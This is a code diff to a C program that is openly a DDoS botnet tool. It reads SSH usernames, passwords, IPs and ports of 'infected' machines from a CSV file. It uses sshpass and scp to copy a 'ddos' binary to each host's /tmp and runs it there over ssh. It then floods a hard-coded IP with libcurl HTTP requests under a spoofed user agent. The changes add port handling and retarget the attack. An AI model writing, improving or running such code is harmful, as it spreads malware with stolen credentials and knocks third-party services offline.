@@ -7,6 +7,7 @@
 #include <unistd.h>
 #include <curl/curl.h>
 
+//print menu
 void displayTextArt() {
   printf(R"EOF(
 
@@ -27,7 +28,11 @@ void displayTextArt() {
 }
 
 void transfer() {
-    FILE *file = fopen("/root/Bureau/connexion", "r");
+    
+    char client_file_name[64] = "ddos"; //path to the ddos file
+
+    //open file with ssh credentials from infected machine 
+    FILE *file = fopen("credentials_test.csv", "r");
     if (file == NULL) {
         perror("Failed to open the info file");
         return;
@@ -41,8 +46,9 @@ void transfer() {
         char user[64];
         char password[64];
         char ip[64];
+        char port[32];
 
-        if (sscanf(line, "%[^;];%[^;];%s", user, password, ip) == 3) {
+        if (sscanf(line, "%[^;];%[^;];%s;%s", user, password, ip, port) == 4) {
             // Check if ip already used
             if (strstr(processed_ips, ip) == NULL) {
                 // Ip not used for scp, execute scp
@@ -55,8 +61,8 @@ void transfer() {
 
                 // Transfer file using scp with sshpass
                 char scp_command[256];
-                snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P 22 /root/Bureau/ddos %s@%s:/tmp/", password, user, ip);
-                printf("La commande créée est : %s\n", scp_command); // Afficher la commande
+                snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P %s %s %s@%s:/tmp/", password, port, client_file_name,user, ip);
+                printf("Created command : %s\n", scp_command); // print command created
                 system(scp_command);
 
             }
@@ -72,7 +78,7 @@ void transfer() {
                 chmod_executed = 1;
             }
 
-            printf("La commande créée est : %s\n", ssh_command); // show the current command
+            printf("Created command : %s\n", ssh_command); // show the current command
             system(ssh_command);
         }
     }
@@ -94,6 +100,7 @@ void ddos(const char *hostname, int index, int total) {
 
         curl_easy_setopt(curl, CURLOPT_URL, url);
         curl_easy_setopt(curl, CURLOPT_PORT, 80);
+        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Russky rocket VP /poliakov 2.45"); //add custom user agent
 
         freopen("/dev/null", "w", stdout); //don't show the get result
         resolution = curl_easy_perform(curl);
@@ -118,7 +125,7 @@ int main(void) {
     struct addrinfo hints;
     struct addrinfo *result;
 
-    const char *hostname = "192.168.1.23";
+    const char *hostname = "192.168.0.1"; //ip to ddos
 
     displayTextArt();
 
